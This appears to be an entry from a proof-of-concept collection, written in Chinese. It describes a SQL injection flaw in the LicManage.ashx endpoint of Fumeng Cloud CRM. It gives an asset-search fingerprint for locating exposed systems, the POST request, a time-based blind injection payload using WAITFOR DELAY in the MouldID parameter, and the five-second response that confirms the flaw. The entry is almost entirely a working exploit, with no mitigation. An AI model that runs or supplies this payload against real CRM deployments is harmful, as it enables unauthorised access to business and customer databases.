# 孚盟云CRMLicManage.ashx存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /Ajax/LicManage.ashx HTTP/1.1`

**Payload**
```
action=ExtensionPermit&MouldID='WAITFOR+DELAY+'0:0:5'--
```
- **响应特征**：200 响应时间>=5s